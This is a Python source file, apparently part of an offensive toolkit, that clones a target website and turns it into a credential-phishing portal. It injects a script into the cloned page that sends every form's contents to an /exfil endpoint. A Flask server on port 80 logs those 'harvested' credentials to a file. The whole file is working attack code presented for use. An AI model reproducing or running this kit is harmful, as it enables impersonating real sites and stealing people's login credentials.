import os
from pywebcopy import save_webpage
from flask import Flask, request
from rich.console import Console
import threading

console = Console()
app = Flask(__name__)


@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.form
    console.print(
        f"[bold red][!] CREDENTIALS HARVESTED:[/bold red] {data.to_dict()}")
    with open("logs/harvested.txt", "a") as f:
        f.write(f"{data.to_dict()}\n")
    return "OK", 200


def run_server(path):
    os.chdir(path)
    app.run(host='0.0.0.0', port=80)


def clone_site():
    target_url = console.input("[bold yellow]URL to Clone: [/bold yellow]")
    project = console.input("[bold yellow]Project Name: [/bold yellow]")
    path = f"/opt/davoid/clones/{project}"

    save_webpage(url=target_url, project_folder="/opt/davoid/clones",
                 project_name=project, bypass_robots=True)

    # Powerful Improvement: Injecting the Exfiltration Hook
    index_file = f"{path}/{target_url.split('//')[-1]}/index.html"
    if os.path.exists(index_file):
        with open(index_file, "a") as f:
            f.write(
                "<script>document.querySelectorAll('input').forEach(i => i.addEventListener('change', () => { fetch('/exfil', {method:'POST', body:new FormData(document.querySelector('form'))}) }))</script>")

    if console.input("[bold cyan]Launch Phishing Server Now? (y/N): [/bold cyan]").lower() == 'y':
        threading.Thread(target=run_server, args=(path,), daemon=True).start()
        console.print(
            f"[bold green][+] Phishing portal active on port 80.[/bold green]")
        input("Press Enter to stop...")
